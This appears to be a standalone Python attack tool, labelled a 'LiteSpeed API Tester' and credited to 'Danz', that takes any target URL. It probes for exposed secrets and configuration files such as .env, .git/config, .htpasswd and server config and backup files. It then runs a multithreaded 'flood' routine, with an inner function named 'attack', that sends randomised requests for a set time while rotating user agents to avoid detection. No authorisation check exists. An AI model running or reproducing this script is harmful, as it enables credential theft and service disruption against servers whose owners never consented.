import time
import json
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class LiteSpeedAPITester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        # LiteSpeed specific endpoints and paths to test
        self.endpoints = [
            "",  # Root path
            "status",
            ".well-known/",
            "api/",
            "static/",
            "media/",
            "admin/",
            "login/",
            "wp-admin/",
            "phpinfo.php",
            "info.php",
            ".git/HEAD",
            "robots.txt",
            "sitemap.xml",
            ".env",
            "config/",
            "backup/",
            "wp-content/uploads/",
            "cgi-bin/",
            # LiteSpeed specific paths
            "docs/",
            "protected/",
            "conf/",
            "logs/",
            ".htaccess",
            "lsws-admin/",
            "phpstatus",
            "server-status",
            "server-info",
            "litespeed_config"
        ]
        # Common file extensions to check
        self.file_extensions = [
            ".php", ".bak", ".old", ".backup", ".zip", 
            ".tar.gz", ".sql", ".conf", ".log", ".env",
            ".xml", ".sh", ".htaccess"
        ]

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def send_request(self, method, url, endpoint):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        
        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url,
                    headers=self.headers,
                    timeout=5,
                    verify=False,
                    allow_redirects=False
                )
            else:
                response = requests.post(
                    full_url,
                    headers=self.headers,
                    timeout=5,
                    verify=False,
                    allow_redirects=False
                )
            
            server_header = response.headers.get('Server', '')
            if 'litespeed' in server_header.lower():
                print(f"[{response.status_code}] {method} {full_url} - LiteSpeed Detected: {server_header}")
            else:
                print(f"[{response.status_code}] {method} {full_url}")
                
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def test_litespeed_config(self, url):
        """Test for common LiteSpeed misconfigurations"""
        tests = [
            "/.git/config",      # Git exposure
            "/conf/httpd_config.conf",  # LiteSpeed config
            "/.env",            # Environment file
            "/backup/",         # Backup directory
            "/.htpasswd",       # Authentication file
            "/phpstatus",       # PHP status page
            "/server-status",   # Server status page
            "/lsws-admin/",     # LiteSpeed admin panel
            "/docs/",           # Documentation directory
            "/conf/",           # Configuration directory
            "/logs/",           # Logs directory
            "/protected/"       # Protected directory
        ]
        for test in tests:
            self.send_request("GET", url, test)

    def flood(self, url, workers=10, duration=60):
        print(f"[INFO] Starting test on {url} for {duration}s with {workers} threads")
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                if random.random() < 0.3:  # 30% chance to append file extension
                    endpoint += random.choice(self.file_extensions)
                method = random.choice(["GET", "HEAD", "POST"])
                self.send_request(method, url, endpoint)
                time.sleep(random.uniform(0.1, 0.3))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    print("""
    ╔════════════════════════════════════════╗
    ║        LITESPEED API Tester            ║
    ║            coded by Danz               ║
    ╚════════════════════════════════════════╝
    """)
    
    target_url = input("Masukan target LiteSpeed URL (e.g., https://example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        workers = int(input("Masukan number of threads (default: 20): ") or 20)
        duration = int(input("Masukan duration in seconds (default: 120): ") or 120)
        
        tester = LiteSpeedAPITester()
        print("[INFO] Testing common LiteSpeed configurations...")
        tester.test_litespeed_config(target_url)
        print("[INFO] Starting main test...")
        tester.flood(target_url, workers=workers, duration=duration)
    except KeyboardInterrupt:
        print("\n[INFO] Test interrupted by user.")
    except ValueError:
        print("[ERROR] Please enter valid numbers for threads and duration.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 
